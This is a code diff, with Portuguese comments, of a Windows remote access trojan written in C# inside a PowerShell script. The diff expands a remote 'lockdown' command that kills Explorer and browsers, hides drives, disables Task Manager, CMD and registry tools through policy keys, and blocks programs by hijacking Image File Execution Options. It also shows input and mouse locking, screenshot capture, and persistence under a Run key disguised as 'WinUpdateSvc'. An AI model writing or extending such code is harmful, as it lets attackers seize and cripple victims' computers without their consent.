@@ -167,10 +167,9 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                 
-                // EXCLUIR RAT
                 if (cmd == "uninstall") { 
                     BlockInput(false); 
-                    UnblockAllApps(); // Restaura os apps antes de sair
+                    UnblockAllApps(); // Restaura o PC antes de sair
                     try {
                         using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
                         using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
@@ -181,26 +180,22 @@ if (-not ("R9KAgent" -as [type])) {
                     Environment.Exit(0); 
                 }
                 
-                // BLOQUEAR APPS
+                // BLOQUEAR TUDO (LOCKDOWN)
                 if (cmd == "block_apps") {
                     BlockAllApps();
-                    lock(writeLock) { myWriter.WriteLine("APPS_BLOQUEADOS"); }
+                    lock(writeLock) { myWriter.WriteLine("PC_BLOQUEADO_TOTALMENTE"); }
                     return;
                 }
 
-                // DESBLOQUEAR APPS
+                // DESBLOQUEAR TUDO
                 if (cmd == "unblock_apps") {
                     UnblockAllApps();
-                    lock(writeLock) { myWriter.WriteLine("APPS_DESBLOQUEADOS"); }
+                    lock(writeLock) { myWriter.WriteLine("PC_LIBERADO"); }
                     return;
                 }
 
-                // TRAVAR MOUSE
                 if (cmd == "lock_mouse") { targetX = Cursor.Position.X; targetY = Cursor.Position.Y; isLocked = true; BlockInput(true); lock(writeLock) { myWriter.WriteLine("MOUSE_TRAVADO"); } return; }
-                
-                // SOLTAR MOUSE
                 if (cmd == "unlock_mouse") { isLocked = false; BlockInput(false); lock(writeLock) { myWriter.WriteLine("MOUSE_SOLTO"); } return; }
-
                 if (cmd == "screenshot") { lock(writeLock) { myWriter.WriteLine("SCREEN:" + CaptureScreen(1920, 85)); } return; }
                 if (cmd == "ping") { lock(writeLock) { myWriter.WriteLine("PONG"); } return; }
 
@@ -224,23 +219,76 @@ if (-not ("R9KAgent" -as [type])) {
         }
 
         static void BlockAllApps() {
-            string[] apps = { "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe", "taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe" };
+            // 1. Mata o Explorer (Barra de tarefas e Área de Trabalho)
+            try { Process.Start("taskkill", "/F /IM explorer.exe").WaitForExit(); } catch {}
+            // Mata os navegadores que já estão abertos
+            string[] browsers = { "chrome", "msedge", "firefox", "opera", "brave" };
+            foreach(var b in browsers) { try { Process.Start("taskkill", "/F /IM " + b + ".exe").WaitForExit(); } catch {} }
+
+            // 2. Bloqueia Discos e Menu Iniciar
+            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")) {
+                key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord); // Esconde todos os discos
+                key.SetValue("NoRun", 1, RegistryValueKind.DWord); // Bloqueia Win+R
+                key.SetValue("NoDesktop", 1, RegistryValueKind.DWord); // Esconde ícones da área de trabalho
+            }
+
+            // 3. Bloqueia Task Manager, CMD e Regedit
+            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System")) {
+                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
+                key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
+            }
+            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System")) {
+                key.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
+            }
+            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System")) {
+                key.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
+            }
+
+            // 4. Bloqueia Navegadores e Programas via IFEO (Impede execução)
+            string[] apps = { "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe", "notepad.exe", "wordpad.exe", "calc.exe", "mspaint.exe", "explorer.exe" };
             foreach (var app in apps) {
                 try {
                     using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + app)) {
-                        key.SetValue("Debugger", "svchost.exe"); // Redireciona para causar erro e não abrir
+                        key.SetValue("Debugger", "svchost.exe");
                     }
                 } catch {}
             }
         }
 
         static void UnblockAllApps() {
-            string[] apps = { "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe", "taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe" };
+            // 1. Restaura Discos e Menu Iniciar
+            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true)) {
+                if (key != null) {
+                    key.DeleteValue("NoViewOnDrive", false);
+                    key.DeleteValue("NoRun", false);
+                    key.DeleteValue("NoDesktop", false);
+                }
+            }
+
+            // 2. Restaura Task Manager e CMD
+            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true)) {
+                if (key != null) {
+                    key.DeleteValue("DisableTaskMgr", false);
+                    key.DeleteValue("DisableRegistryTools", false);
+                }
+            }
+            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Policies\Microsoft\Windows\System", true)) {
+                if (key != null) key.DeleteValue("DisableCMD", false);
+            }
+            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System", true)) {
+                if (key != null) key.DeleteValue("DisableCMD", false);
+            }
+
+            // 3. Remove bloqueios do IFEO
+            string[] apps = { "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe", "notepad.exe", "wordpad.exe", "calc.exe", "mspaint.exe", "explorer.exe" };
             foreach (var app in apps) {
                 try {
                     Registry.LocalMachine.DeleteSubKeyTree(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + app, false);
                 } catch {}
             }
+
+            // 4. Inicia o Explorer.exe novamente
+            try { Process.Start("explorer.exe"); } catch {}
         }
 
         static string CaptureScreen(int maxW, long quality) {
